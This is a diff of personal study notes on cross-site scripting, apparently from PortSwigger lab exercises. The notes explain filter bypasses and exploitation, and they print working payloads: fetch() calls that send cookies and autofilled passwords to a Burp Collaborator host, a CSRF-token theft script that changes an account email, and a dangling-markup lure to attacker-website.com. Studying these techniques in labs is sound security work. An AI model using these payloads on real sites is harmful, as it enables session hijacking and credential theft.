@@ -88,7 +88,7 @@ XSS into JavaScript: (18)
     + It work because:
         + First step: HTML parser, browser read all document to identify html tag, when it meet </script>, instant close, 
         + Second step: Javascript parser, analysis <script></script> identified in first step, original script is getting error (because of var input = ') -> onerror -> alert
-- Breaking out of a JavaScript string: (9), (19)
+- Breaking out of a JavaScript string: (9), (19), (28)
     Example:
         '-alert(document.domain)-'
         ';alert(document.domain)//
@@ -105,6 +105,41 @@ XSS into JavaScript: (18)
             <script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
             <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
             <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+- Making use of HTML-encoding: (20)
+    + XSS context inside a quote tag attribute, such as event handler, possible make use of HTML-encoding to work around some input filters
+    + When parsed out the HTML tags and attribute within a response, perform HTML-decoding values before they process any further
+    + Can use to bypass input validation by HTML-encoding those characters
+        Example: 
+            <a href="#" onclick="... var input='controllable data here'; ...">  -> Filter block
+            <a href="#" onclick="... var input='&apos;-alert(document.domain)-&apos;'; ..."> -> Bypass filter
+- XSS in JavaScript template literals: (21)
+    + String literals that allow embedded JavaScript expressions
+        Example: ${...} syntax.
+
+XSS via client-side template injection:
+- https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
+- Focus on AngularJS framework as this is the most common
+    + How to escape from the AngularJS sandbox
+    + How to potentially use AngularJS features to bypass CSP
+
+Exploiting XSS vulnerabilities:
+- XSS Steal cookies: (22)
+    + Limit of this technique:
+        + The victim might not be logged in.
+        + Many applications hide their cookies from JavaScript using the HttpOnly flag.
+        + Sessions might be locked to additional factors like the user's IP address.
+        + The session might time out before you're able to hijack it.
+- XSS to capture passwords: (23)
+    + Advantage: reading the auto-filled password
+    + Disadvantage: only work on user who have password manager perform auto fill
+- XSS to bypass CSRF protections: (24)
+    + Some web allow logged-in user change email address without re-entering password
+    + If XSS on these sites, can steal CSRF token and change to attacker's email
+    + Then trigger password reset to gain access to account
+
+Dangling markup injection:
+- Technique for capturing data cross-domain when full XSS attack isn't possible
+- Example: "><img src='//attacker-website.com?
 
 
 01_Reflected_XSS_into_HTML_context_with_nothing_encoded
@@ -223,6 +258,57 @@ XSS into JavaScript: (18)
 - Payload:
     \';alert(document.domain)//
 
+20_Stored_XSS_into_onclick_event_with_angle_brackets_and_double_quotes_HTML_encoded_and_single_quotes_and_backslash_escaped
+- Use HTML-decoding mechanism to escape a single quote
+- Payload: (in comment)
+    https://test.com&apos;-alert(document.domain)-&apos;
+
+21_Reflected_XSS_into_a_template_literal_with_angle_brackets_single_double_quotes_backslash_and_backticks_Unicode_escaped
+- Using this innerTxt() function to trigger
+    <script>
+        var message = `0 search results for '${alert(1)}'`;
+        document.getElementById('searchMessage').innerText = message;
+    </script>
+- Payload:
+    ${alert(1)}
+
+22_Exploiting_cross_site_scripting_to_steal_cookies
+- This web vuln in comment section
+    + When user go to this blog, it will load all the comment
+    + Using that, we can steal cookies whenever the comment is loaded
+- Payload:
+    <script>fetch('https://{burp_collab}',{{method:'POST',mode:'no-cors',body:document.cookie+document.domain}});</script>
+
+23_Exploiting_cross_site_scripting_to_capture_passwords
+- Require: password manager and auto fill username, password
+- When user click it and autofill, data will send back to attacker
+- Payload:
+    <input name=username id=username>
+    <input type=password name=password onchange="if(this.value.length)fetch('https://{burp_collab}',{{
+        method:'POST',
+        mode: 'no-cors',
+        body:username.value+':'+this.value
+    }});">
+
+24_Exploiting_XSS_to_bypass_CSRF_defenses
+- This web is vuln in change email
+    + Not require password before changing
+    + Just need call API to change it
+- Payload:
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = handleResponse;
+        req.open('get','/my-account',true);
+        req.send();
+        function handleResponse() {{
+            var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];
+            var changeReq = new XMLHttpRequest();
+            changeReq.open('post', '/my-account/change-email', true);
+            changeReq.send('csrf='+token+'&email=test@test.com')
+        }};
+    </script>
+
+
 27_Reflected_XSS_with_event_handlers_and_href_attributes_blocked
 - This construct base on tag are allowed, but no fire event are allow
 - Instead of using href inside tag <a>, we set href value through <animate> tag
@@ -235,3 +321,27 @@ XSS into JavaScript: (18)
     </svg>
 
 28_Reflected_XSS_in_a_JavaScript_URL_with_some_characters_blocked
+- I don't know much about JS, so copy from solution and analyze
+- Payload:
+    /post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+- Analyze:
+    javascript:fetch(
+        '/analytics',
+        {method:'post',body:'/post?postId=5&'},
+        x=x=>{throw/**/onerror=alert,1337},
+        toString=x,
+        window+'',
+        {x:''}
+    ).finally(_=>window.location='/')
+
+    + Must have postId=5&, if not it will raise error "Invalid blog post ID"
+    + {throw/**/onerror=alert,1337} -> block statement
+      x=x=>{throw/**/onerror=alert,1337} -> object literal (expression)
+    + Lab blocked space, so use /**/ to replace space
+    + this function named x {onerror=alert and throw return 1337(return last in comma operator), trigger onerror}
+    + toString=x -> window.toString = x
+    + window+'' -> trigger toString function and calling function x
+    + {x:''} -> object literal (expression) to avoid syntax error
+
+29_Reflected_XSS_protected_by_very_strict_CSP_with_dangling_markup_attack
+- 
